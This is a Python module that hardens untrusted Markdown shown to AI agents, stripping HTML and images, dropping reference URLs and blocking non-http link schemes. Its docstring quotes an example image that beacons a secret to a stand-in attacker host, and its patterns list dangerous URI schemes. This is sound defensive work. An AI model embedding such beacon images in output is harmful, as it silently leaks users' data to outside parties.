"""Neutralize exfiltration and injection vectors in untrusted Markdown.

When Markdown is returned to an agent or rendered, its most dangerous
feature is auto-rendered images and links: an image such as
`![x](http://attacker/?secret=...)` beacons data out with zero clicks, and
dangerous-scheme links (`javascript:`, `data:`, `file:`) run code or read
local files on one click. Raw embedded HTML reintroduces both. This module
applies a conservative, linear-time transform that strips HTML, defangs
images by dropping their URLs, keeps only http/https links, and neutralizes
dangerous-scheme URIs. It is a hardening transform, not a full renderer.
"""

import re

# All patterns are bounded and use negated character classes or a lazy
# bounded quantifier, so they run in linear time and cannot be turned into
# a ReDoS.
# Comments are stripped first, and across newlines, because a multiline
# comment otherwise slips past the single-line tag pattern.
_HTML_COMMENT = re.compile(r"<!--[\s\S]{0,4000}?-->")
_HTML_TAG = re.compile(r"<[^>\n]{0,2000}>")
_IMAGE = re.compile(r"!\[([^\]\n]{0,500})\]\([^)\n]{0,2000}\)")
# Reference-style images beacon just like inline ones: !\[alt\]\[ref\] and the
# shortcut !\[ref\] both resolve to a URL declared in a reference definition.
_IMAGE_REF = re.compile(r"!\[([^\]\n]{0,500})\]\[[^\]\n]{0,200}\]")
_IMAGE_SHORTCUT = re.compile(r"!\[([^\]\n]{0,500})\](?![(\[])")
# Reference definitions carry the URL the references above resolve to, so the
# URL is dropped even when nothing visible references it.
_REF_DEF = re.compile(r"(?m)^([ ]{0,3})\[([^\]\n]{1,200})\]:[ \t]*\S{0,2000}.*$")
_LINK = re.compile(r"\[([^\]\n]{0,500})\]\(([^)\s]{0,2000})\)")
_DANGEROUS_SCHEME = re.compile(r"(?i)(javascript|data|vbscript|file):(?=\S)")

ALLOWED_LINK_SCHEMES = frozenset({"http", "https"})


def sanitize_markdown(text: str) -> str:
    """Return Markdown with HTML stripped and exfiltration vectors removed."""
    text = _HTML_COMMENT.sub("", text)
    text = _HTML_TAG.sub("", text)
    text = _IMAGE.sub(lambda m: f"[image removed: {m.group(1)}]", text)
    text = _IMAGE_REF.sub(lambda m: f"[image removed: {m.group(1)}]", text)
    text = _IMAGE_SHORTCUT.sub(lambda m: f"[image removed: {m.group(1)}]", text)
    text = _REF_DEF.sub(lambda m: f"{m.group(1)}[{m.group(2)}]: (link removed)", text)
    text = _LINK.sub(_sanitize_link, text)
    text = _DANGEROUS_SCHEME.sub(lambda m: m.group(1) + "-scheme-blocked:", text)
    return text


def _sanitize_link(match: re.Match) -> str:
    label = match.group(1)
    url = match.group(2).strip()
    scheme = url.split(":", 1)[0].lower() if ":" in url else ""
    # A relative link has no scheme and is safe; an http/https link is kept
    # but a caller can still see it. Any other scheme drops to plain text.
    if scheme and scheme not in ALLOWED_LINK_SCHEMES:
        return f"[{label}]"
    return f"[{label}]({url})"
